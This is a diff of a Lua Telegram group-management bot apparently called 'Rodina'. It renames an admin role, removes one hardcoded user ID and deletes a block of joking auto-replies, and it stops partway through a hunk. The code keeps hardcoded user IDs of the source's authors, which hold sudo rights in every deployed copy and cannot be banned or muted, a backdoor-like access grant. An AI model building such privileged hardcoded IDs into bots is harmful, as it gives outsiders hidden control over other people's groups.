@@ -175,7 +175,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end 
 
-sudo_users = {SUDO,1236115319,1981394343,99988776655}   
+sudo_users = {SUDO,1981394343,99988776655}   
 function Developers(msg)  
 local DRAGON = false  
 for k,v in pairs(dev_users) do  
@@ -186,7 +186,7 @@ end
 return DRAGON  
 end 
 
-sudo_users = {SUDO,1981394343,99988776655,1236115319}   
+sudo_users = {SUDO,1981394343,99988776655}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -321,8 +321,6 @@ if tonumber(user_id) == tonumber(1981394343) then
 var = true 
 elseif tonumber(user_id) == tonumber(99988776655) then
 var = true  
-elseif tonumber(user_id) == tonumber(1236115319) then
-var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -363,8 +361,6 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1981394343) then  
 var = 'المبرمج سمير' 
-elseif tonumber(user_id) == tonumber(1236115319) then
-var = 'المبرمج ليجاند' 
 elseif tonumber(user_id) == tonumber(99988776655) then
 var = 'مطور السورس' 
 elseif tonumber(user_id) == tonumber(SUDO) then
@@ -372,7 +368,7 @@ var = 'المطور الاساسي'
 elseif bot_data:sismember(bot_id.."Dev:leg:2", user_id) then
 var = "المطور الاساسي²"  
 elseif bot_data:sismember(bot_id.."msa3d:leg", user_id) then
-var = "انتيمي"
+var = "مساعد"
 elseif bot_data:sismember(bot_id.."SirSudoGp", user_id) then
 var = "ثانوي مجموعه"
 elseif bot_data:sismember(bot_id.."SudoBotGp", user_id) then
@@ -1630,7 +1626,7 @@ if not msa3d(msg) then
 local bl = '⌯انت الان المطور الاساسي² في البوت⌯\n⌯سورس رودينا⌯\n⌯يمكنك تحكم في البوتات من الكيبورد⌯\n[⌯ انضم الى قناه السورس وتابع كل جديد ⌯](t.me/p_120o)'
 local keyboard = {
 {'الاحصائيات'},
-{'المطور','الانتيمي'},
+{'المطور','المساعد'},
 {'معلومات الكيبورد'},
 {'قسـم مـطـورين السـورس','اوامـر اضـف ومـسـح'},
 {'اوامـر تفعيل و تعطـيل','اوامـر الحـمـايه'},
@@ -1687,7 +1683,7 @@ if text == '/start' or text == '『رجوع』' then
 if msa3d(msg) then
 local bl = '⌯انت الان المطور الاساسي في البوت⌯\n⌯سورس رودينا⌯\n⌯يمكنك تحكم في البوتات من الكيبورد⌯\n[⌯ انضم الى قناه السورس وتابع كل جديد ⌯](t.me/p_120o)'
 local keyboard = {
-{'قناة السورس','المبرمج احمد'},
+{'قناة السورس','المبرمج سمير'},
 {'ضع اسم للبوت','معلومات الكيبورد'},
 {'المطور','الاحصائيات'},
 {'≪━━━━☩𝑹𝑶𝑫𝑰𝑵𝑨☩━━━━≫'},
@@ -2584,7 +2580,7 @@ if text then
 local textsudo = 'مرحبا عزيزي المطور الاساسي\n'..
 'رساله من ['..result.first_name_..'](tg://user?id='..msg.sender_user_id_..')\n'..
 '\n'..text
-local textmsa3d = 'مرحبا عزيزي الانتيمي\n'..
+local textmsa3d = 'مرحبا عزيزي المساعد\n'..
 'رساله من ['..result.first_name_..'](tg://user?id='..msg.sender_user_id_..')\n'..
 '\n'..text
 sendText(SUDO,textsudo,0,'md')
@@ -2919,7 +2915,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-sendText(SUDO," 🌝 هناك من بحاجه الى انتيميه \n 🌝 الشخص  {"..Name.."}\n 🌝 اسم الجروب {"..NameChat.."}\n 🌝 ايدي الجروب {`"..msg.chat_id_.."`}\n 🌝 رابط الجروب \n ["..LinkGroup.."] ",0,'md')
+sendText(SUDO," 🌝 هناك من بحاجه الى مساعده \n 🌝 الشخص  {"..Name.."}\n 🌝 اسم الجروب {"..NameChat.."}\n 🌝 ايدي الجروب {`"..msg.chat_id_.."`}\n 🌝 رابط الجروب \n ["..LinkGroup.."] ",0,'md')
 end,nil)
 end,nil)
 end
@@ -3792,7 +3788,7 @@ keyboard.inline_keyboard = {
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/43&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'مريم' then
@@ -3984,19 +3980,48 @@ tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_, offse
 end,nil)
 end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
-if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
-local Text = [[ 
+
+if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then 
+local Text = [[
 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝑹𝑶𝑫𝑰𝑵𝑨 
 ]]
-keyboard = {}
+keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '• ᴍʏ ᴅᴇᴠ', callback_data="/mydev"},{text = '• ᴍʏ ᴄʜᴀɴɴᴇʟ', callback_data="/channel"}},
-{{text = 'مـطـوري♡', url="http://t.me/"..sudos.UserName}},
-{{text = 'اضف البوت لمجموعتك♡' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}}, 
+{{text = '•𝑪𝑯 ♪', callback_data="/channel"},{text = '•𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑬𝑹𝑺♪', callback_data="/mydev"}},   
+{{text = '˹𝑪𝑯  𝑩𝑨𝑲𝑨𝑹˼', url="t.me/UU_SD1"}},
+{{text = '♪مــطــور الــبــوت•', url="http://t.me/"..sudos.UserName}},
+{{text = '♪ اضغط لاضافه البوت لمجمعتك •' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+
+if text == 'سمير عصام' or text == 'سمير' or text == 'المبرمج سمير' then
+local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
+if TEXT_SUDO then 
+send(msg.chat_id_, msg.id_,TEXT_SUDO)
+else
+tdcli_function ({ID = "GetUser",user_id_ = 1981394343,},function(arg,result) 
+local function taha(extra, taha, success)
+if taha.photos_[0] then
+local Name = 'المبرمج 🌚💘\n['..result.first_name_..'](t.me/Sameer_Essam)\n'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = '  ❨ '..result.first_name_..'  ❩ ',url="t.me/Sameer_Essam"},
+},
+{{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+else
+sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
+ end end
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1981394343, offset_ = 0, limit_ = 1 }, taha, nil)
+end,nil)
+end
+end
+
 if text == 'تغير شكل السورس' and not bot_data:get(bot_id..'Namebot'..msg.chat_id_) then     
 tdcli_function ({ID = "GetUser",user_id_ = bot_id, offset_},function(extra,result,success)
 local msg_id = msg.id_/2097152/0.5  
@@ -4031,7 +4056,7 @@ keyboard.inline_keyboard = {
 {{text = '𝘾𝙃', url="t.me/p_120o"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/43&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'رودينا' or text == 'سورس مين ده' then
@@ -4046,7 +4071,7 @@ keyboard.inline_keyboard = {
 {{text = '𝘾𝙃', url="t.me/p_120o"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/43&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
@@ -4424,7 +4449,7 @@ keyboard.inline_keyboard = {
 {{text = '𝘾𝙃', url="t.me/p_120o"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/aslak8/43&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/fxcvS/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --------------------------------------------------------------------------------------------------------------
 if text == ("مسح قائمه العام") and Devleg(msg) then
@@ -4483,7 +4508,7 @@ send(msg.chat_id_, msg.id_, "* 🌝 لا تستطيع حظره او كتمه ع�
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1819632524) then  
-send(msg.chat_id_, msg.id_, "* 🌝 لا تسطيع حظر عمك سمير عام*")
+send(msg.chat_id_, msg.id_, "* 🌝 لا تسطيع حظر المبرمج سمير عام*")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
@@ -4494,7 +4519,7 @@ if tonumber(result.sender_user_id_) == tonumber(99988776655) then
 send(msg.chat_id_, msg.id_, "* 🌝 لا تسطيع حظر الواد عبدو تايجر عام*")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1853574370) then  
+if tonumber(result.sender_user_id_) == tonumber(1231233322222) then  
 send(msg.chat_id_, msg.id_, "* 🌝 لا تسطيع حظر الواد ابو مجد عام*")
 return false 
 end
@@ -4537,7 +4562,7 @@ send(msg.chat_id_, msg.id_, " 🌝 لا يمكنك حظر المطور الاس�
 return false 
 end
 if bot_data:sismember(bot_id.."msa3d:leg", result.id_) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر انتيمي عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر مساعد عام")
 return false 
 end
 if tonumber(result.id_) == tonumber(1236115319) then  
@@ -4545,14 +4570,14 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر المبرمج ليج�
 return false 
 end
 if result.id_ == tonumber(1981394343) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر عمك سمير عام \n")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر المبرمج سمير عام \n")
 return false 
 end
 if result.id_ == tonumber(99988776655) then
 send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر الواد عبدو تايجر عام \n")
 return false 
 end
-if result.id_ == tonumber(1853574370) then
+if result.id_ == tonumber(1231233322222) then
 send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر الواد ابو مجد عام \n")
 return false 
 end
@@ -4593,18 +4618,18 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر المبرمج ليج�
 return false 
 end
 if bot_data:sismember(bot_id.."msa3d:leg", userid) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر انتيمي عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر مساعد عام")
 return false 
 end
 if tonumber(userid) == tonumber(1981394343) then  
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر عمك سمير عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر المبرمج سمير عام")
 return false 
 end
 if tonumber(userid) == tonumber(99988776655) then  
 send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر الواد عبدو تايجر عام")
 return false 
 end
-if tonumber(userid) == tonumber(1853574370) then  
+if tonumber(userid) == tonumber(1231233322222) then  
 send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع حظر الواد ابو مجد عام")
 return false 
 end
@@ -4642,11 +4667,11 @@ send(msg.chat_id_, msg.id_, "* 🌝 لا تستطيع حظره او كتمه ع�
 return false 
 end
 if bot_data:sismember(bot_id.."msa3d:leg", result.sender_user_id_) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم انتيمي عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم مساعد عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1981394343) then  
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم عمك سمير عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم المبرمج سمير عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
@@ -4699,7 +4724,7 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم المبرمج ليج�
 return false 
 end
 if result.id_ == tonumber(1981394343) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم عمك سمير عام \n")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم المبرمج سمير عام \n")
 return false 
 end
 if result.id_ == tonumber(99988776655) then
@@ -4707,7 +4732,7 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم الواد عبدو ت
 return false 
 end
 if bot_data:sismember(bot_id.."msa3d:leg", result.id_) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم انتيمي عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم مساعد عام")
 return false 
 end
 usertext = '\n 🌝 الـعـضو ⇇ ['..result.title_..'](t.me/'..(username or 'p_120o')..')'
@@ -4747,7 +4772,7 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم المبرمج ليج�
 return false 
 end
 if tonumber(userid) == tonumber(1981394343) then  
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم عمك سمير عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم المبرمج سمير عام")
 return false 
 end
 if tonumber(userid) == tonumber(99988776655) then  
@@ -4755,7 +4780,7 @@ send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم الواد عبدو ت
 return false 
 end
 if bot_data:sismember(bot_id.."msa3d:leg", userid) then
-send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم انتيمي عام")
+send(msg.chat_id_, msg.id_, " 🌝 لا تسطيع كتم مساعد عام")
 return false 
 end
 bot_data:sadd(bot_id..'Gmute:User', userid)
@@ -7852,18 +7877,18 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("رفع انتيمي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
+if text == ("رفع مساعد") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
 function Function_DRAGON(extra, result, success)
 bot_data:del(bot_id.."msa3d:leg")
 bot_data:sadd(bot_id.."msa3d:leg", result.sender_user_id_)
 bot_data:set(bot_id.."id:msa3d:leg", result.sender_user_id_)
-Reply_Status(msg,result.sender_user_id_,"reply"," 🌝 تم ترقيته انتيمي في البوت")  
+Reply_Status(msg,result.sender_user_id_,"reply"," 🌝 تم ترقيته مساعد في البوت")  
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
 return false 
 end
-if text and text:match("^رفع انتيمي @(.*)$") and SudoBot(msg) then
-local username = text:match("^رفع انتيمي @(.*)$")
+if text and text:match("^رفع مساعد @(.*)$") and SudoBot(msg) then
+local username = text:match("^رفع مساعد @(.*)$")
 function Function_DRAGON(extra, result, success)
 if result.id_ then
 if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
@@ -7873,7 +7898,7 @@ end
 bot_data:del(bot_id.."msa3d:leg")
 bot_data:sadd(bot_id.."msa3d:leg", result.id_)
 bot_data:set(bot_id.."id:msa3d:leg", result.id_)
-Reply_Status(msg,result.id_,"reply"," 🌝 تم ترقيته انتيمي في البوت")  
+Reply_Status(msg,result.id_,"reply"," 🌝 تم ترقيته مساعد في البوت")  
 else
 send(msg.chat_id_, msg.id_," 🌝 لا يوجد حساب بهاذا المعرف")
 end
@@ -7881,35 +7906,35 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
 return false 
 end
-if text and text:match("^رفع انتيمي (%d+)$") and SudoBot(msg) then
-local userid = text:match("^رفع انتيمي (%d+)$")
+if text and text:match("^رفع مساعد (%d+)$") and SudoBot(msg) then
+local userid = text:match("^رفع مساعد (%d+)$")
 bot_data:del(bot_id.."msa3d:leg")
 bot_data:sadd(bot_id.."msa3d:leg", userid)
 bot_data:set(bot_id.."id:msa3d:leg", userid)
-Reply_Status(msg,userid,"reply"," 🌝 تم ترقيته انتيمي في البوت")  
+Reply_Status(msg,userid,"reply"," 🌝 تم ترقيته مساعد في البوت")  
 return false 
 end
-if text == ("تنزيل الانتيمي") and SudoBot(msg) then
+if text == ("تنزيل المساعد") and SudoBot(msg) then
 function Function_DRAGON(extra, result, success)
 local id = bot_data:get(bot_id.."id:msa3d:leg")
-Reply_Status(msg,id,"reply"," 🌝 تم تنزيله من الانتيمي")  
+Reply_Status(msg,id,"reply"," 🌝 تم تنزيله من المساعد")  
 bot_data:del(bot_id.."msa3d:leg")
 bot_data:del(bot_id.."id:msa3d:leg")
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
 return false 
 end
-if text == ("تنزيل انتيمي") and SudoBot(msg) then
+if text == ("تنزيل مساعد") and SudoBot(msg) then
 function Function_DRAGON(extra, result, success)
 local id = bot_data:get(bot_id.."id:msa3d:leg")
-Reply_Status(msg,id,"reply"," 🌝 تم تنزيله من الانتيمي")  
+Reply_Status(msg,id,"reply"," 🌝 تم تنزيله من المساعد")  
 bot_data:del(bot_id.."msa3d:leg")
 bot_data:del(bot_id.."id:msa3d:leg")
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
 return false 
 end
-if text == "الانتيمي" or text == "انتيمي" then
+if text == "المساعد" or text == "مساعد" then
 local id = bot_data:get(bot_id.."id:msa3d:leg")
 local urrl = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..id)
 local json = JSON.decode(urrl)
@@ -7919,7 +7944,7 @@ username = json.result.username
 else
 username = 'p_120o'
 end
-local Name = '⌯ الانتيمي ⌯'..name..'\n'
+local Name = '⌯ المساعد ⌯'..name..'\n'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text = name, url="t.me/"..username}},}
 local msg_id = msg.id_/2097152/0.5
@@ -13766,433 +13791,6 @@ send(msg.chat_id_,msg.id_, ' البوت شغال ')
 return false
 end
 
-if text == 'سلام' or text == 'مع سلامه' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني 😹💔🎶](t.me/p_120o)')
-return false
-end
-
-if text == 'هاي' or text == 'هيي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_," 🌝 معطله") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[خالتك جرت ورايا 😹💔](t.me/p_120o)')
-return false
-end
-
-if text == 'برايفت' or text == 'تع برايفت' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي 🥺💜](t.me/p_120o)')
-return false
-end
-
-if text == 'النبي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام 🌝💛](t.me/p_120o)')
-return false
-end
-
-if text == 'نعم' or text == 'يا نعم' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[نعم الله عليك 🌚❤️](t.me/p_120o)')
-return false
-end
-
-if text == '🙄' or text == '🙄🙄' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️](t.me/p_120o)')
-return false
-end
-
-if text == 'شكرا' or text == 'مرسي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[العفو ياروحي 🙈🌝](t.me/p_120o)')
-return false
-end
-
-if text == 'حلوه' or text == 'حلو' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر 🤤🌝](t.me/p_120o)')
-return false
-end
-
-if text == 'بموت' or text == 'هموت' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب 😑😂](t.me/p_120o)')
-return false
-end
-
-
-if text == 'اي' or text == 'ايي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي 😹👻](t.me/p_120o)')
-return false
-end
-
-if text == 'طيب' or text == 'تيب' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[فرح خالتك قريب 😹💋💃🏻](t.me/p_120o)')
-return false
-end
-
-if text == 'حاضر' or text == 'حتر' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب 🙂❤️](t.me/p_120o)')
-return false
-end
-
-if text == 'جيت' or text == 'انا جيت' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/p_120o)')
-return false
-end
-if text == 'بخ' or text == 'عو' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي 🥺💔](t.me/p_120o)')
-return false
-end
-if text == 'حبيبي' or text == 'حبيبتي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[اوه ياه 🌝😂](t.me/p_120o)')
-return false
-end
-if text == 'تمام' or text == 'تمم' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[امك اسمها احلام 😹😹](t.me/p_120o)')
-return false
-end
-if text == 'خلاص' or text == 'خلص' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[خلصتت  روحكك يبعيد 😹💔](t.me/p_120o)')
-return false
-end
-if text == 'سي في' or text == 'سيفي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك 😎😂](t.me/p_120o)')
-return false
-end
-if text == '😂' or text == '😂😂😂' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == '😹' or text == '😹😹😹' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == '🤔' or text == '🤔🤔🤔' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[بتفكر في اي 🤔](t.me/p_120o)')
-return false
-end
-if text == '🌚' or text == '🌝' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[القمر ده شبهك 🙂❤️](t.me/p_120o)')
-return false
-end
-if text == '💋' or text == '💋💋💋' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/p_120o)')
-return false
-end
-if text == '😭' or text == '😭😭😭' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب 😥](t.me/p_120o)')
-return false
-end
-if text == '🥺' or text == '🥺🥺🥺' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[متزعلش بحبك 😻🤍](t.me/p_120o)')
-return false
-end
-if text == '😒' or text == '😒😒😒' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒🙄](t.me/p_120o)')
-return false
-end
-if text == 'بحبك' or text == 'حبق' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
